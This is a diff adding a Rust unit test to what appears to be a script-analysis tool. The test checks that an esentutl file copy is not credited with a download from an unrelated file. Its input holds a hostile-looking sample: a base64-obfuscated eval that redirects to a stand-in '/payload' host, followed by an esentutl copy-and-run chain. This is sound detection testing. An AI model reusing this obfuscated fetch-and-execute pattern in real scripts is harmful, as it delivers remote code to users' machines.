@@ -9090,6 +9090,28 @@ call C:\Temp\original.js"#,
             report.traits
         );
     }
+
+    #[test]
+    fn esentutl_explicit_source_path_does_not_use_unrelated_basename_content() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXNlbnR1dGwtd3JvbmctYmFzZW5hbWUuZXhhbXBsZS9wYXlsb2FkJw==")) > D:\Other\original.js
+esentutl /y C:\Work\original.js /d C:\Temp\renamed.js /o
+call C:\Temp\renamed.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://esentutl-wrong-basename.example/payload"
+                )
+            }),
+            "esentutl explicit source path reused unrelated basename content: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
